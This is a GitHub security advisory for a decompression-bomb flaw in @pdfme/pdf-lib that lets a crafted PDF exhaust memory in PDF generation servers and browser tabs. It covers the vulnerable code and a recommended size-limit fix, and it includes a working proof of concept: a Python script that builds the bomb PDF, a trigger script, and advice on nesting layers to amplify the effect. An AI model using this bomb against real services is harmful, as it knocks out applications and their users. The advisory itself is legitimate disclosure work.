# [M] PDFME Affected by Decompression Bomb in FlateDecode Stream Parsing Causes Memory Exhaustion DoS

## Summary
Severity: Medium
Advisory: GHSA-vrqm-gvq7-rrwh
CWE: CWE-409
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-03-20
Source: https://github.com/advisories/GHSA-vrqm-gvq7-rrwh
Type: github-advisory

## Affected
- npm: `@pdfme/pdf-lib` — affected >=0 <5.5.10

## Details
## Summary

The `DecodeStream.ensureBuffer()` method in `@pdfme/pdf-lib` doubles its internal buffer without any upper bound on the decompressed size. A crafted PDF containing a FlateDecode stream with a high compression ratio (decompression bomb) causes unbounded memory allocation during stream decoding, leading to memory exhaustion and denial of service in both server-side (generator) and client-side (UI) contexts.

## Details

The vulnerability exists in the `DecodeStream` class, which is the base class for all stream decoders including `FlateStream` (DEFLATE/zlib decompression).

**Unbounded buffer growth in `ensureBuffer()`** — `packages/pdf-lib/src/core/streams/DecodeStream.ts:148-160`:

```typescript
protected ensureBuffer(requested: number) {
  const buffer = this.buffer;
  if (requested <= buffer.byteLength) {
    return buffer;
  }
  let size = this.minBufferLength;
  while (size < requested) {
    size *= 2;  // Doubles with no upper bound
  }
  const buffer2 = new Uint8Array(size);  // Allocates without limit
  buffer2.set(buffer);
  return (this.buffer = buffer2);
}
```

The `size *= 2` loop has no maximum size check. The buffer will continue doubling until the process runs out of memory.

**Unconditional full decompression in `decode()`** — `DecodeStream.ts:139-141`:

```typescript
decode(): Uint8Array {
  while (!this.eof) this.readBlock();  // Fully decompresses before returning
  return this.buffer.subarray(0, this.bufferLength);
}
```

**`FlateStream.readBlock()`** calls `ensureBuffer()` repeatedly during decompression — `packages/pdf-lib/src/core/streams/FlateStream.ts:272-274`:

```typescript
if (pos + 1 >= limit) {
  buffer = this.ensureBuffer(pos + 1);
  limit = buffer.length;
}
```

And again at line 297-300:

```typescript
if (pos + len >= limit) {
  buffer = this.ensureBuffer(pos + len);
  limit = buffer.length;
}
```

**Entry point via `basePdf`** — `packages/generator/src/helper.ts:42-43`:

```typescript
const willLoadPdf = await getB64BasePdf(basePdf);
const embedPdf = await PDFDocument.load(willLoadPdf);
```

The `basePdf` parameter accepts base64-encoded data, a URL, or raw bytes. When `PDFDocument.load()` parses the PDF, it encounters FlateDecode streams and decompresses them through `FlateStream` → `DecodeStream` with no size limits.

The same code path exists in the UI package at `packages/ui/src/helper.ts:292` and `packages/ui/src/hooks.ts:67`.

## PoC

**Step 1: Create a decompression bomb PDF**

```python
#!/usr/bin/env python3
"""Generate a PDF decompression bomb for PoC."""
import zlib
import struct

# Create highly compressible data: 100MB of null bytes
# compresses to ~100KB (~1000:1 ratio)
uncompressed = b'\x00' * (100 * 1024 * 1024)  # 100 MB
compressed = zlib.compress(uncompressed, 9)

# Minimal PDF structure with FlateDecode stream
pdf = b"""%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj

2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj

3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]
   /Contents 4 0 R >>
endobj

4 0 obj
<< /Filter /FlateDecode /Length """ + str(len(compressed)).encode() + b""" >>
stream
""" + compressed + b"""
endstream
endobj

xref
0 5
"""
# Write proper xref (simplified for PoC)
with open("bomb.pdf", "wb") as f:
    f.write(pdf)
    f.write(b"trailer << /Size 5 /Root 1 0 R >>\nstartxref\n0\n%%EOF\n")

print(f"Compressed size: {len(compressed)} bytes")
print(f"Decompressed size: {len(uncompressed)} bytes")
print(f"Ratio: {len(uncompressed)/len(compressed):.0f}:1")
```

**Step 2: Trigger via @pdfme/generator**

```javascript
const { generate } = require('@pdfme/generator');
const fs = require('fs');

const bombPdf = fs.readFileSync('bomb.pdf');

// This will cause unbounded memory allocation during PDF parsing
generate({
  template: {
    basePdf: bombPdf,  // Attacker-controlled input
    schemas: [[]],
  },
  inputs: [{}],
  plugins: {},
}).catch(err => console.error('OOM or crash:', err.message));
```

**Step 3: Observe memory exhaustion**

```bash
# Monitor memory usage — the Node.js process will consume all available memory
# and either crash with a heap allocation failure or be OOM-killed
node --max-old-space-size=512 trigger.js
# Expected: "FATAL ERROR: CALL_AND_RETRY_LAST Allocation failed - JavaScript heap out of memory"
```

For higher amplification (e.g., 10GB decompressed from ~10MB compressed), nest multiple FlateDecode layers or use a larger null-byte payload.

## Impact

- **Denial of Service**: Any application using `@pdfme/generator` or `@pdfme/ui` that allows users to supply PDF templates is vulnerable to memory exhaustion. A single crafted PDF can crash the Node.js process or freeze the browser tab.
- **Server-side impact**: In server-side PDF generation pipelines, this can take down the entire service. The ~1000:1 amplification ratio means a ~100KB upload can force allocation of ~100MB+ of memory, and larger ratios are achievable.
- **Client-side impact**: In browser-based usage (Designer/Form/Viewer components), loading a malicious template freezes the tab and may crash the browser process.
- **No authentication bypass needed**: The attack only requires the ability to supply a `basePdf` value, which is the standard template input parameter — no elevated privileges are needed.

## Recommended Fix

Add a maximum decoded size limit to `ensureBuffer()` in `packages/pdf-lib/src/core/streams/DecodeStream.ts`:

```typescript
const MAX_DECODED_SIZE = 100 * 1024 * 1024; // 100 MB

class DecodeStream implements StreamType {
  // ... existing fields ...

  protected ensureBuffer(requested: number) {
    const buffer = this.buffer;
    if (requested <= buffer.byteLength) {
      return buffer;
    }

    if (requested > MAX_DECODED_SIZE) {
      throw new Error(
        `Decoded stream size ${requested} exceeds maximum allowed size ${MAX_DECODED_SIZE}. ` +
        `This may indicate a decompression bomb.`
      );
    }

    let size = this.minBufferLength;
    while (size < requested) {
      size *= 2;
    }

    // Cap the allocation even if the doubling overshoots
    if (size > MAX_DECODED_SIZE) {
      size = MAX_DECODED_SIZE;
    }

    const buffer2 = new Uint8Array(size);
    buffer2.set(buffer);
    return (this.buffer = buffer2);
  }
}
```

Optionally, expose the limit via `PDFDocument.load()` options so consumers can tune it:

```typescript
// In LoadOptions interface:
interface LoadOptions {
  // ... existing options ...
  maxDecodedStreamSize?: number; // Default: 100 MB
}
```

## References
- https://github.com/pdfme/pdfme/security/advisories/GHSA-vrqm-gvq7-rrwh
- https://github.com/pdfme/pdfme
